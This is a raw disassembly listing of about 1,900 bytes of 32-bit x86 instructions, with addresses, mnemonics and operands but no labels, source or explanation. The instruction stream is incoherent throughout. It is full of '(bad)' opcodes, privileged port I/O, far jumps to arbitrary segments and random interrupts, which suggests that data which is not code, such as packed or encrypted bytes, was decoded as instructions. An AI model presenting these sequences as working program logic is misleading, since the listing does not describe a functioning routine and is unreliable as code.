  414682:	gs jo  0x414618
  414685:	or     BYTE PTR [edx],bh
  414687:	retf   
  414688:	mov    ds:0xe43f48df,eax
  41468d:	inc    eax
  41468e:	test   DWORD PTR [eax-0x6502edcc],esi
  414694:	xchg   ecx,eax
  414695:	push   0x32
  414697:	pop    esp
  414698:	adc    esi,DWORD PTR [eax-0x71]
  41469b:	push   edi
  41469c:	jg     0x414718
  41469e:	out    dx,al
  41469f:	or     ecx,esp
  4146a1:	inc    ecx
  4146a2:	std    
  4146a3:	mov    ch,0xb4
  4146a5:	es jmp 0x4146be
  4146a8:	repz inc esi
  4146aa:	adc    bh,BYTE PTR [edx]
  4146ac:	popa   
  4146ad:	pop    ss
  4146ae:	adc    eax,0x3fb2e533
  4146b3:	ret    
  4146b4:	out    0x64,al
  4146b6:	dec    ebp
  4146b7:	mov    ebx,0x131b7ec
  4146bc:	xchg   ecx,eax
  4146bd:	shl    DWORD PTR [esi],0x95
  4146c0:	aaa    
  4146c1:	push   ebp
  4146c2:	retf   0x5b56
  4146c5:	fdivp  st(2),st
  4146c7:	lea    ebp,[eax-0x4b17ba41]
  4146cd:	jg     0x4146de
  4146cf:	stos   DWORD PTR es:[edi],eax
  4146d0:	(bad)  
  4146d1:	in     al,0x4d
  4146d3:	pop    ds
  4146d4:	jmp    0x3f13:0x191a28eb
  4146db:	enter  0xefbc,0xe5
  4146df:	sbb    BYTE PTR ds:0xe5d24ab0,cl
  4146e5:	or     DWORD PTR [edx+0x62],ebx
  4146e8:	into   
  4146e9:	cwde   
  4146ea:	(bad)  
  4146eb:	add    bl,BYTE PTR [bx+si]
  4146ee:	dec    eax
  4146ef:	cmp    bh,al
  4146f1:	pop    edx
  4146f2:	fadd   QWORD PTR [edx+0x494cecd3]
  4146f8:	or     esi,ebp
  4146fa:	pusha  
  4146fb:	and    edi,ebx
  4146fd:	data16 stos BYTE PTR es:[edi],al
  4146ff:	call   0x8112f596
  414704:	inc    edi
  414705:	mov    dh,0x41
  414707:	mov    cl,0x30
  414709:	mov    ?,WORD PTR [esi+0x55]
  41470c:	sbb    al,0xd8
  41470e:	call   0x67d14f86
  414713:	mov    bl,dl
  414715:	imul   edx,DWORD PTR [edx],0x183327af
  41471b:	imul   eax,DWORD PTR [edx-0x34808789],0x9128985f
  414725:	xchg   DWORD PTR [esi],ebp
  414727:	out    dx,eax
  414728:	cmp    esi,DWORD PTR [ecx-0x39]
  41472b:	mov    esi,0xe35ecb52
  414730:	push   ds
  414731:	pushf  
  414732:	rcr    DWORD PTR [esi+0x3d4201cb],1
  414738:	aam    0x8c
  41473a:	jnp    0x4146f1
  41473c:	cmp    al,0xa6
  41473e:	cdq    
  41473f:	test   DWORD PTR [ecx-0x504eca7b],edx
  414745:	dec    ecx
  414746:	adc    eax,ebx
  414748:	aad    0x35
  41474a:	inc    ebx
  41474b:	inc    ebx
  41474c:	mov    DWORD PTR [esi+0x51],edi
  41474f:	call   0x7eb1b20c
  414754:	fstp   QWORD PTR [esi]
  414756:	jo     0x414719
  414758:	cwde   
  414759:	fwait
  41475a:	jbe    0x41474f
  41475c:	loope  0x4146e2
  41475e:	dec    ecx
  41475f:	adc    eax,0x8c6c0223
  414764:	inc    eax
  414765:	push   cs
  414766:	xchg   edx,eax
  414767:	sub    ch,bl
  414769:	dec    edx
  41476a:	adc    al,BYTE PTR [edx+esi*1+0x32]
  41476e:	in     al,dx
  41476f:	shl    BYTE PTR [ecx],cl
  414771:	mov    esi,0x45de5e38
  414776:	mov    eax,0x866b457a
  41477b:	rol    ebp,1
  41477d:	add    esi,ebx
  41477f:	inc    esi
  414780:	sub    al,0xc4
  414782:	sbb    bl,BYTE PTR [esi-0x3b6c50d7]
  414788:	rol    BYTE PTR [ebx+0x3d],cl
  41478b:	shl    DWORD PTR [ebx+0x4817148f],cl
  414791:	repz pop ebx
  414793:	sar    BYTE PTR [edi+0x54],cl
  414796:	dec    esp
  414797:	push   ebx
  414798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414799:	sbb    BYTE PTR [ecx+0xa2da4c1],ah
  41479f:	push   edi
  4147a0:	hlt    
  4147a1:	out    dx,al
  4147a2:	int    0xec
  4147a4:	fild   QWORD PTR ds:0xdc783d97
  4147aa:	dec    ecx
  4147ab:	add    bh,BYTE PTR [esi+esi*2]
  4147ae:	mov    edx,0x558cfe5c
  4147b3:	sbb    DWORD PTR [esi],edi
  4147b5:	loope  0x414782
  4147b7:	push   ecx
  4147b8:	mov    dl,0x7d
  4147ba:	out    dx,eax
  4147bb:	test   DWORD PTR [edx+ecx*1-0x66],ebp
  4147bf:	sbb    BYTE PTR [edi+ebx*1+0x71],ch
  4147c3:	loopne 0x41477b
  4147c5:	mov    ds:0x2e7626cf,al
  4147ca:	outs   dx,BYTE PTR ds:[esi]
  4147cb:	sbb    eax,0x7c3aa388
  4147d0:	int3   
  4147d1:	dec    esp
  4147d2:	inc    edx
  4147d3:	pop    ebx
  4147d4:	das    
  4147d5:	cmc    
  4147d6:	mov    edx,0x5c2d1969
  4147db:	mov    al,0x77
  4147dd:	rcr    eax,0x82
  4147e0:	mov    al,0x9e
  4147e2:	pushf  
  4147e3:	vmulps ymm2,ymm2,ymm0
  4147e7:	sbb    esp,DWORD PTR [esi]
  4147e9:	sub    al,0xea
  4147eb:	sub    edi,DWORD PTR [edx]
  4147ed:	push   ds
  4147ee:	or     eax,0xb80966b7
  4147f3:	iret   
  4147f4:	sar    DWORD PTR [edx+0x34ba66a7],cl
  4147fa:	xchg   edi,eax
  4147fb:	adc    eax,0x638e09fe
  414800:	in     al,dx
  414801:	pop    ecx
  414802:	push   edi
  414803:	or     al,0x81
  414805:	lock sbb dl,BYTE PTR [eax-0x48]
  414809:	adc    al,0x82
  41480b:	push   0xffffffc2
  41480d:	ret    0xf093
  414810:	sti    
  414811:	imul   ebx,DWORD PTR [edi],0xffffffbd
  414814:	or     eax,0x9dee9ee6
  414819:	mov    dh,0x44
  41481b:	lods   eax,DWORD PTR ds:[esi]
  41481c:	mov    ebp,0xfc03ce5
  414821:	rcl    DWORD PTR [esp+edx*4-0x19a8114f],1
  414828:	retf   
  414829:	js     0x4148a0
  41482b:	jl     0x414810
  41482d:	push   ecx
  41482e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41482f:	(bad)  
  414831:	push   ebx
  414832:	pop    eax
  414833:	xchg   DWORD PTR ds:0x79062744,esp
  414839:	inc    ebx
  41483a:	add    eax,0xe2097a3d
  41483f:	jb     0x4147e3
  414841:	sar    DWORD PTR [eax+0x64af53e7],0xe
  414848:	sbb    BYTE PTR [ecx-0x8096273],dl
  41484e:	cwde   
  41484f:	sbb    BYTE PTR [edx+0x586163ed],ch
  414855:	jno    0x4147e2
  414857:	imul   edx,DWORD PTR [ebp-0x2f],0xc7a88a5f
  41485e:	mov    ds:0xa7cd8686,eax
  414863:	mov    esi,db3
  414866:	mov    WORD PTR [eax-0x202d8d1c],es
  41486c:	push   esp
  41486d:	in     al,0x84
  41486f:	add    dl,BYTE PTR [edx+ebx*4-0x5d]
  414873:	adc    BYTE PTR [edi+0x5d0aebea],ch
  414879:	mov    ebx,0x4c39843d
  41487e:	push   ecx
  41487f:	add    dh,BYTE PTR [ebp+0x26]
  414882:	adc    eax,ebx
  414884:	ss loopne 0x414883
  414887:	out    0x4e,eax
  414889:	lds    ebx,FWORD PTR [ecx]
  41488b:	dec    ebp
  41488c:	jb     0x4148a5
  41488e:	mov    ebx,0x1761ffd1
  414893:	cmp    DWORD PTR [edi-0x6f],esi
  414896:	jp     0x41481d
  414898:	inc    ebp
  414899:	xchg   esp,eax
  41489a:	jecxz  0x414876
  41489c:	xchg   ebx,eax
  41489d:	mov    ebx,DWORD PTR [ecx+eiz*8-0x2e]
  4148a1:	add    al,0x93
  4148a3:	push   ebx
  4148a4:	cdq    
  4148a5:	scas   al,BYTE PTR es:[edi]
  4148a6:	and    edx,eax
  4148a8:	outs   dx,BYTE PTR ds:[esi]
  4148a9:	ret    0xec69
  4148ac:	stos   BYTE PTR es:[edi],al
  4148ad:	lock lahf 
  4148af:	cmp    al,0x97
  4148b1:	nop
  4148b2:	xor    eax,0xa2c8addd
  4148b7:	and    dl,cl
  4148b9:	pop    es
  4148ba:	jecxz  0x414858
  4148bc:	in     al,0x6f
  4148be:	and    ebx,DWORD PTR [ecx+0x7f6fcf72]
  4148c4:	cmp    eax,0xe66b1094
  4148c9:	ret    
  4148ca:	lods   al,BYTE PTR ds:[esi]
  4148cb:	retf   
  4148cc:	lahf   
  4148cd:	push   ds
  4148ce:	or     BYTE PTR [ebx-0x7d4b9b9a],ch
  4148d4:	mov    dl,0x61
  4148d6:	mov    esi,DWORD PTR [edi]
  4148d8:	mov    DWORD PTR fs:[esi+0x5edd275b],ebx
  4148df:	sahf   
  4148e0:	js     0x414937
  4148e2:	lods   al,BYTE PTR ds:[esi]
  4148e3:	enter  0xce06,0x22
  4148e7:	push   ebp
  4148e8:	pop    ebp
  4148e9:	fwait
  4148ea:	sti    
  4148eb:	mov    ecx,ds
  4148ed:	mov    bh,0x87
  4148ef:	cmc    
  4148f0:	or     ch,bl
  4148f2:	sub    ah,0xa4
  4148f5:	xchg   ebp,eax
  4148f6:	jnp    0x414972
  4148f8:	test   eax,0xf14cfbf7
  4148fd:	and    edx,0xffffffda
  414900:	cmp    al,cl
  414902:	pop    ebp
  414903:	add    cl,al
  414905:	mov    ah,0xd2
  414907:	or     ebp,ebx
  414909:	pushf  
  41490a:	retf   0xe583
  41490d:	(bad)  
  41490e:	fnsave [ecx+0x17]
  414911:	les    esi,FWORD PTR [eax]
  414913:	test   BYTE PTR [esi+0x406d29ab],ah
  414919:	add    ecx,DWORD PTR [ebp+0x6702730e]
  41491f:	push   edi
  414920:	ror    DWORD PTR [esi-0x18],1
  414923:	hlt    
  414924:	inc    esp
  414925:	std    
  414926:	sahf   
  414927:	in     al,dx
  414928:	scas   al,BYTE PTR es:[edi]
  414929:	inc    eax
  41492a:	sub    DWORD PTR [edi],ecx
  41492c:	adc    BYTE PTR [ecx+edi*2-0x5fc5e00d],dl
  414933:	outs   dx,BYTE PTR ds:[esi]
  414934:	jmp    0x41493e
  414936:	js     0x414914
  414938:	(bad)  [bx-0x73ac]
  41493d:	or     bh,BYTE PTR [esi+0xa]
  414940:	xor    ecx,DWORD PTR [edx]
  414942:	outs   dx,DWORD PTR ds:[esi]
  414943:	mov    WORD PTR [edi+0x2f],?
  414946:	cmp    eax,0x3b3774d
  41494b:	jp     0x4149a6
  41494d:	cmc    
  41494e:	iret   
  41494f:	mov    esi,0xff35332e
  414954:	dec    edx
  414955:	cli    
  414956:	enter  0xbc31,0x99
  41495a:	push   edx
  41495b:	or     ecx,edi
  41495d:	push   0xac22cc8
  414962:	jno    0x4149c6
  414964:	dec    ebp
  414965:	cli    
  414966:	mov    dl,0xb7
  414968:	mov    ds:0xe64b7c57,al
  41496d:	mov    WORD PTR [eax-0x76],fs
  414970:	out    dx,eax
  414971:	mov    esp,0xf368ab60
  414976:	arpl   WORD PTR [esi+ebp*1-0x3af0f4b8],di
  41497d:	jl     0x4149bc
  41497f:	mov    ah,0xb0
  414981:	pop    es
  414982:	and    esi,DWORD PTR [edx+0x15f1cb9e]
  414988:	push   cs
  414989:	mov    al,ds:0x5a3ec859
  41498e:	pop    es
  41498f:	cmp    ebp,DWORD PTR [ebp-0xf]
  414992:	nop
  414993:	mov    al,0x4
  414995:	jmp    0xe52998c0
  41499a:	mov    edx,ecx
  41499c:	sbb    bl,ah
  41499e:	fdivr  QWORD PTR [ecx]
  4149a0:	jge    0x4149ab
  4149a2:	cdq    
  4149a3:	inc    esp
  4149a4:	inc    ebx
  4149a5:	mov    ecx,0xaf03cbef
  4149aa:	and    edx,0x71
  4149ad:	fisttp WORD PTR [edi+0x40b96426]
  4149b3:	imul   ecx,DWORD PTR [ebp+0x3faaf353],0x10
  4149ba:	mov    ebx,DWORD PTR [ecx]
  4149bc:	cmp    ch,dl
  4149be:	sub    ch,BYTE PTR [ebx]
  4149c0:	mov    bh,al
  4149c2:	jne    0x4149a1
  4149c4:	cli    
  4149c5:	ror    DWORD PTR [eax-0x7e63dfc6],cl
  4149cb:	lea    eax,[eax+0x1c]
  4149ce:	aaa    
  4149cf:	retf   
  4149d0:	add    BYTE PTR [ecx+0x4871f86e],ah
  4149d6:	shld   DWORD PTR [si],esp,0xf4
  4149db:	lods   al,BYTE PTR ds:[esi]
  4149dc:	and    ch,BYTE PTR [edi+0xc]
  4149df:	mov    ds:0xd1f0002e,al
  4149e4:	mov    dl,0x80
  4149e6:	jo     0x414a40
  4149e8:	scas   al,BYTE PTR es:[edi]
  4149e9:	push   ss
  4149ea:	cvtpi2ps xmm3,QWORD PTR [ebx]
  4149ed:	add    BYTE PTR [ebp+ebp*1-0x2305e9e7],al
  4149f4:	addr16 pop edx
  4149f6:	and    ah,bl
  4149f8:	mov    ah,0xbe
  4149fa:	aaa    
  4149fb:	pop    ss
  4149fc:	or     ecx,DWORD PTR [eax]
  4149fe:	out    dx,eax
  4149ff:	xchg   esi,eax
  414a00:	loopne 0x4149fd
  414a02:	xchg   esi,eax
  414a03:	int    0x50
  414a05:	xchg   edi,ecx
  414a07:	dec    edx
  414a08:	(bad)  
  414a09:	in     eax,0xa1
  414a0b:	inc    esp
  414a0c:	es data16 clc 
  414a0f:	mov    bh,0x74
  414a11:	shl    DWORD PTR [ebp-0x5f],0x92
  414a15:	pop    edx
  414a16:	mov    esp,0xc5577127
  414a1b:	shl    BYTE PTR [ebx-0x50],cl
  414a1e:	idiv   ch
  414a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a21:	and    BYTE PTR [esi-0x1af278a],dh
  414a27:	sbb    DWORD PTR [esi+0x3ae15c9e],edi
  414a2d:	fnstenv [eax+0x19]
  414a30:	cmc    
  414a31:	pop    ebx
  414a32:	mov    DWORD PTR [ebp+0x23],ebx
  414a35:	sahf   
  414a36:	jmp    0x414a2e
  414a38:	xchg   edx,eax
  414a39:	mov    esi,0x5a11011f
  414a3e:	out    dx,eax
  414a3f:	dec    ecx
  414a40:	popa   
  414a41:	fsub   QWORD PTR [esi+eax*1+0x217b2ab2]
  414a48:	cmp    eax,0x6f1499a
  414a4d:	(bad)  
  414a4e:	mov    eax,ds:0xe1febc1c
  414a53:	cdq    
  414a54:	(bad)  
  414a55:	lock fwait
  414a57:	mov    ecx,0x5ab67e7c
  414a5c:	dec    esp
  414a5d:	xor    eax,0xad8211b3
  414a62:	lock push ss
  414a64:	pusha  
  414a65:	adc    eax,0x23c424b4
  414a6a:	shl    DWORD PTR [ecx],0x34
  414a6d:	push   ebx
  414a6e:	cdq    
  414a6f:	or     al,0xd
  414a71:	mov    WORD PTR [ebx-0x45d604ff],ss
  414a77:	inc    eax
  414a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a79:	sub    BYTE PTR [ebx-0x6b],0x12
  414a7d:	or     ebp,DWORD PTR [esi-0x1372730c]
  414a83:	sbb    edx,DWORD PTR [ecx+0x4d]
  414a86:	sbb    edx,DWORD PTR [eax-0x4b]
  414a89:	and    edi,esp
  414a8b:	push   0xcec7c673
  414a90:	lods   al,BYTE PTR ds:[esi]
  414a91:	fs ins DWORD PTR es:[edi],dx
  414a93:	frstor [ecx]
  414a95:	scas   al,BYTE PTR es:[edi]
  414a96:	xchg   ebp,eax
  414a97:	xchg   ecx,eax
  414a98:	and    DWORD PTR [ebx+0x4a1c177c],eax
  414a9e:	out    dx,al
  414a9f:	test   DWORD PTR [esi],0x70e7b4ab
  414aa5:	add    eax,0x238fc25f
  414aaa:	retf   0x91d5
  414aad:	in     al,0x2c
  414aaf:	mov    ch,0x40
  414ab1:	stc    
  414ab2:	mov    al,ds:0x7d9a9ffd
  414ab7:	jge    0x414a6e
  414ab9:	cmp    ecx,0xffffffe2
  414abc:	xchg   BYTE PTR [edi],al
  414abe:	fs jb  0x414b1e
  414ac1:	std    
  414ac2:	loopne 0x414a50
  414ac4:	jmp    0xd720:0x463ede83
  414acb:	test   BYTE PTR cs:[ebx],0x26
  414acf:	dec    ecx
  414ad0:	mov    cl,0x85
  414ad2:	dec    eax
  414ad3:	(bad)  
  414ad4:	stos   DWORD PTR es:[edi],eax
  414ad5:	nop
  414ad6:	jg     0x414b02
  414ad8:	and    al,0x3e
  414ada:	std    
  414adb:	xor    eax,0x310a067f
  414ae0:	ffree  st(3)
  414ae2:	dec    esi
  414ae3:	std    
  414ae4:	dec    esi
  414ae5:	xchg   edi,eax
  414ae6:	das    
  414ae7:	push   edi
  414ae8:	stos   BYTE PTR es:[edi],al
  414ae9:	or     al,0x55
  414aeb:	(bad)  
  414aec:	push   0x4fe16f77
  414af1:	stc    
  414af2:	jmp    0x414af5
  414af4:	test   dh,dl
  414af6:	sub    esi,DWORD PTR [ecx-0x17db34e7]
  414afc:	(bad)  
  414afe:	std    
  414aff:	mov    dh,0x4
  414b01:	leave  
  414b02:	jne    0x414b25
  414b04:	jg     0x414b4d
  414b06:	ins    DWORD PTR es:[edi],dx
  414b07:	out    0xcf,eax
  414b09:	loope  0x414aa5
  414b0b:	mov    edi,0xdb7e91a0
  414b10:	or     DWORD PTR [ebx+0x31abfaf8],ebp
  414b16:	mov    al,ds:0xba1bccc3
  414b1b:	cs or  eax,ecx
  414b1e:	and    bl,ah
  414b20:	loopne 0x414ac4
  414b22:	int3   
  414b23:	push   0xd
  414b25:	add    al,0x70
  414b27:	mov    bh,0x60
  414b29:	out    0xbd,eax
  414b2b:	fsubrp st(7),st
  414b2d:	xor    ch,dl
  414b2f:	ss repz dec esi
  414b32:	add    esp,eax
  414b34:	pop    es
  414b35:	packuswb mm4,mm5
  414b38:	adc    eax,0x5b5d1347
  414b3d:	inc    ebx
  414b3e:	test   DWORD PTR [eax],0x7f984f53
  414b44:	out    0xdb,eax
  414b46:	and    dh,0x2e
  414b49:	(bad)  
  414b4b:	fstp   QWORD PTR [eax-0x28fba341]
  414b51:	stos   BYTE PTR es:[edi],al
  414b52:	out    0xf6,al
  414b54:	ret    
  414b55:	xchg   edi,eax
  414b56:	xchg   ecx,eax
  414b57:	add    DWORD PTR [esp+edi*8],eax
  414b5a:	fbld   TBYTE PTR [ebx+eiz*4+0x856348e]
  414b61:	aaa    
  414b62:	sti    
  414b63:	int    0xc5
  414b65:	xchg   edx,eax
  414b66:	lods   al,BYTE PTR ss:[esi]
  414b68:	icebp  
  414b69:	nop
  414b6a:	add    ecx,DWORD PTR [edx+0x272f4690]
  414b70:	pop    edx
  414b71:	sbb    al,0x16
  414b73:	nop
  414b74:	adc    edx,edi
  414b76:	or     dl,ah
  414b78:	jne    0x414b0c
  414b7a:	mov    gs:0xcc963e8c,eax
  414b80:	int    0xec
  414b82:	mov    cs,WORD PTR [ebx]
  414b84:	popf   
  414b85:	adc    eax,0xfc466c12
  414b8a:	push   DWORD PTR [ecx-0x55]
  414b8d:	xor    eax,0x57d154cc
  414b92:	sbb    BYTE PTR [ebp-0x13],al
  414b95:	sub    DWORD PTR [edx+0x7b],0x1edff9e8
  414b9c:	adc    DWORD PTR [edi],esp
  414b9e:	int    0xeb
  414ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ba1:	inc    ebx
  414ba2:	adc    bh,BYTE PTR [esi-0x18]
  414ba5:	pop    edx
  414ba6:	add    ebx,DWORD PTR [eax]
  414ba8:	cmp    eax,0x390dc925
  414bad:	xor    ebp,eax
  414baf:	imul   edi,DWORD PTR [esi-0x32],0x22
  414bb3:	xchg   ebp,eax
  414bb4:	pop    esp
  414bb5:	ja     0x414c1a
  414bb7:	leave  
  414bb8:	pop    eax
  414bb9:	mov    bl,dl
  414bbb:	das    
  414bbc:	outs   dx,BYTE PTR ds:[esi]
  414bbd:	pop    edi
  414bbe:	int    0xb4
  414bc0:	rcl    DWORD PTR [ebp+0x570c3f73],cl
  414bc6:	mov    ebp,0xebac696e
  414bcb:	aam    0x7f
  414bcd:	dec    eax
  414bce:	and    DWORD PTR [ecx-0x48],eax
  414bd1:	stos   DWORD PTR es:[edi],eax
  414bd2:	sbb    esi,DWORD PTR [eax+0x745980d]
  414bd8:	retf   
  414bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bda:	add    BYTE PTR [ebx],bh
  414bdc:	out    dx,eax
  414bdd:	mov    ds:0x30f7f2fa,al
  414be2:	les    ecx,FWORD PTR [ecx+0x3eafeaab]
  414be8:	adc    bh,bl
  414bea:	(bad)  
  414beb:	jbe    0x414bad
  414bed:	mov    WORD PTR [ecx+0x57],ds
  414bf0:	sub    eax,0x4678f03c
  414bf5:	cs sbb al,0xb9
  414bf8:	addr16 fs pop ebx
  414bfb:	inc    ecx
  414bfc:	adc    DWORD PTR [ebx],edx
  414bfe:	jns    0x414bcf
  414c00:	inc    edi
  414c01:	pop    esi
  414c02:	jmp    0x46e2:0x71be76c5
  414c09:	add    BYTE PTR [edi],0x75
  414c0c:	xchg   ecx,eax
  414c0d:	adc    al,0x1b
  414c0f:	fdiv   QWORD PTR ss:[edx]
  414c12:	dec    ebx
  414c13:	loope  0x414b9a
  414c15:	mov    WORD PTR [ebp+edx*4+0x12],ds
  414c19:	es (bad) 
  414c1b:	fst    QWORD PTR [ebx+0x7df5b432]
  414c21:	loopne 0x414bb8
  414c23:	inc    esi
  414c24:	test   edi,ecx
  414c26:	fdivr  QWORD PTR [edx-0x1036f1ee]
  414c2c:	cld    
  414c2d:	fadd   st,st(7)
  414c2f:	in     al,dx
  414c30:	iret   
  414c31:	or     BYTE PTR [edi],0xfe
  414c34:	jp     0x414c33
  414c36:	jns    0x414cb4
  414c38:	xchg   ebp,eax
  414c39:	cwde   
  414c3a:	std    
  414c3b:	jbe    0x414c56
  414c3d:	jns    0x414bec
  414c3f:	ret    0xb423
  414c42:	mov    ch,0xec
  414c44:	fisttp QWORD PTR [edx+edx*2+0x52]
  414c48:	ficom  WORD PTR ds:0x6d7a014a
  414c4e:	mov    WORD PTR [ecx+eiz*1-0x76576db5],gs
  414c55:	dec    ebx
  414c56:	les    edi,FWORD PTR [esi-0x504ed41a]
  414c5c:	add    BYTE PTR [edi-0x51],dl
  414c5f:	and    BYTE PTR [edx-0x7e0dbbe7],bh
  414c65:	(bad)  [esi+0x2b]
  414c68:	cmp    eax,0xa10b24de
  414c6d:	or     DWORD PTR ds:0x3a2e40b0,ecx
  414c73:	arpl   WORD PTR [ebx-0x23],si
  414c76:	(bad)  
  414c77:	das    
  414c78:	mov    BYTE PTR [eax-0x41],bh
  414c7b:	int    0x29
  414c7d:	mov    bh,0xf9
  414c7f:	std    
  414c80:	adc    eax,0xbf3ac1da
  414c85:	sbb    BYTE PTR [esi+0x67],ch
  414c88:	jns    0x414c7e
  414c8a:	jae    0x414cd5
  414c8c:	jns    0x414c53
  414c8e:	sahf   
  414c8f:	in     eax,dx
  414c90:	mov    esi,esi
  414c92:	adc    ecx,esp
  414c94:	ret    0xaf7b
  414c97:	xchg   edx,eax
  414c98:	in     al,0x8c
  414c9a:	not    bl
  414c9c:	mov    esi,0x71a093da
  414ca1:	push   esi
  414ca2:	std    
  414ca3:	fxch   st(3)
  414ca5:	ins    BYTE PTR es:[edi],dx
  414ca6:	cdq    
  414ca7:	or     eax,0x541fd796
  414cac:	dec    edi
  414cad:	clc    
  414cae:	push   ebx
  414caf:	les    esi,FWORD PTR [esi+0x33]
  414cb2:	mov    ecx,0xb7b9dfeb
  414cb7:	xchg   edi,eax
  414cb8:	imul   esp,DWORD PTR [edx],0xffffff80
  414cbb:	dec    ebx
  414cbc:	call   0x26ea472c
  414cc1:	pop    esi
  414cc2:	xchg   edi,eax
  414cc3:	sbb    DWORD PTR [ebp-0x35],ecx
  414cc6:	mov    eax,ds:0xe58bf754
  414ccb:	int    0x15
  414ccd:	(bad)  
  414cce:	push   esi
  414ccf:	ds sahf 
  414cd1:	out    dx,eax
  414cd2:	xor    eax,0xb959a77c
  414cd7:	cmp    ah,BYTE PTR [esp+eax*1+0x78]
  414cdb:	jmp    0x1331:0x86fedd47
  414ce2:	fstp   QWORD PTR [edx]
  414ce4:	and    eax,0x8d973c95
  414ce9:	not    dl
  414ceb:	dec    ebp
  414cec:	fidiv  DWORD PTR [eax-0x3c02be85]
  414cf2:	int3   
  414cf3:	scas   al,BYTE PTR es:[edi]
  414cf4:	mov    ds:0x45fff51e,al
  414cf9:	call   0xc083:0xeb6fa581
  414d00:	ins    BYTE PTR es:[edi],dx
  414d01:	cld    
  414d02:	adc    ebp,DWORD PTR [esi-0x5e]
  414d05:	das    
  414d06:	cmp    bl,BYTE PTR [edx]
  414d08:	(bad)  
  414d09:	xor    BYTE PTR [edi-0x42],dl
  414d0c:	add    al,0x0
  414d0e:	sar    DWORD PTR [ecx-0x5],0x1b
  414d12:	jecxz  0x414cdf
  414d14:	scas   al,BYTE PTR es:[edi]
  414d15:	lahf   
  414d16:	cmp    edx,DWORD PTR [esi+0x49a26e8]
  414d1c:	pushf  
  414d1d:	jg     0x414cab
  414d1f:	xchg   esp,eax
  414d20:	or     BYTE PTR [eax-0x75dedd55],0x2c
  414d27:	add    esp,DWORD PTR [edi]
  414d29:	jnp    0x35ad062a
  414d2f:	inc    ebx
  414d30:	retf   
  414d31:	push   esp
  414d32:	retf   0x8738
  414d35:	adc    DWORD PTR [ecx],ebp
  414d37:	sets   BYTE PTR ds:0x7d34e635
  414d3e:	add    al,0x24
  414d40:	jecxz  0x414d0a
  414d42:	das    
  414d43:	les    esi,FWORD PTR [edx]
  414d45:	mov    edx,0x344d801d
  414d4a:	or     al,0xc7
  414d4c:	jno    0x414d4f
  414d4e:	mul    edx
  414d50:	mov    esi,DWORD PTR [ebx+0x29e28ffa]
  414d56:	lock or al,0xac
  414d59:	cld    
  414d5a:	inc    eax
  414d5b:	adc    edi,DWORD PTR [ebp+0x5beeaae9]
  414d61:	pop    edi
  414d62:	pop    ebp
  414d63:	aaa    
  414d64:	inc    eax
  414d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d66:	mov    BYTE PTR [esi],cl
  414d68:	imul   esi,esp,0xb6c758be
  414d6e:	pop    ebp
  414d6f:	dec    edi
  414d70:	enter  0xe750,0x6f
  414d74:	xor    ebx,DWORD PTR [ebx+ebx*1-0x4ba52ce]
  414d7b:	repnz cmp esp,DWORD PTR [ebp+0x5]
  414d7f:	cmp    eax,0xb6738019
  414d84:	push   es
  414d85:	dec    edi
  414d86:	fcom   st(0)
  414d88:	into   
  414d89:	and    eax,0xc704d625
  414d8e:	inc    ebx
  414d8f:	mov    eax,0x61fb0350
  414d94:	std    
  414d95:	cmp    eax,0x36a99dbd
  414d9a:	xor    eax,0x42cccc87
  414d9f:	sti    
  414da0:	(bad)  
  414da1:	clc    
  414da2:	loopne 0x414e00
  414da4:	outs   dx,DWORD PTR ds:[esi]
  414da5:	mov    bl,0x27
  414da7:	mov    ds:0x35fabe7a,al
  414dac:	loope  0x414deb
  414dae:	imul   ebx,DWORD PTR [edx-0x242d2860],0xffffff80
  414db5:	cmp    BYTE PTR [ebp+0x553a2e83],al
  414dbb:	cmp    bl,BYTE PTR [edi+0x67]
  414dbe:	jle    0x414d89
  414dc0:	in     al,0x99
  414dc2:	push   esp
  414dc3:	imul   ecx,DWORD PTR [edi-0x35d091ac],0xffffff9a
  414dca:	popf   
  414dcb:	mov    dh,0x82
  414dcd:	mov    BYTE PTR [ebx-0x46],bh
  414dd0:	sub    ebx,DWORD PTR [edi-0x1b]
  414dd3:	inc    esp
  414dd4:	cmp    DWORD PTR [edi],esi
  414dd6:	push   edx
  414dd7:	jo     0x414e03
  414dd9:	or     BYTE PTR [ebx],0x7a
  414ddc:	xlat   BYTE PTR ds:[ebx]
  414ddd:	mov    cl,0x96
  414ddf:	dec    ebp
  414de0:	popa   
  414de1:	scas   eax,DWORD PTR es:[edi]
  414de2:	sub    DWORD PTR [esi],esp
  414de4:	xchg   esp,eax
  414de5:	std    
  414de6:	mov    eax,ds:0x6c48d744
  414deb:	shl    BYTE PTR [esi-0x71e42dd7],1
  414df1:	sbb    al,0xfa
  414df3:	sahf   
  414df4:	jbe    0x414e4c
  414df6:	or     ebp,ebx
  414df8:	sub    al,0xa7
  414dfa:	lahf   
  414dfb:	test   dh,dl
  414dfd:	jbe    0x414e11
  414dff:	add    al,BYTE PTR [ebx-0x66]
  414e02:	pop    eax
  414e03:	(bad)  
  414e04:	ins    DWORD PTR es:[edi],dx
  414e05:	adc    edi,esi
  414e07:	dec    esp
  414e08:	mov    eax,ds:0xd04f34e7
  414e0d:	mov    ss,WORD PTR [edx-0x204fe98b]
  414e13:	pop    esp
  414e14:	xchg   DWORD PTR [esp+eax*2-0x671f12e4],edx
  414e1b:	add    al,0x1b
  414e1d:	std    
  414e1e:	cmp    eax,esi
  414e20:	test   dl,bh
  414e22:	scas   eax,DWORD PTR es:[edi]
  414e23:	out    dx,al
  414e24:	and    DWORD PTR [edx+esi*8],0x2e
  414e28:	sbb    BYTE PTR [esi-0x57],al
  414e2b:	jle    0x414dc9
  414e2d:	jle    0x414e9b
  414e2f:	and    eax,0x12574d58
  414e34:	pushf  
  414e35:	pop    ss
  414e36:	xchg   edi,eax
  414e37:	cwde   
  414e38:	xchg   BYTE PTR [eax-0x60],dl
  414e3b:	mov    ss,WORD PTR [edx-0x468b0b91]
  414e41:	cdq    
  414e42:	inc    ebp
  414e43:	sub    bh,ch
  414e45:	shl    esp,cl
  414e47:	xchg   edi,eax
  414e48:	inc    edi
  414e49:	test   edx,ecx
  414e4b:	lock enter 0x4962,0x4c
  414e50:	test   BYTE PTR [eax],dh
  414e52:	and    ebx,DWORD PTR [ecx]
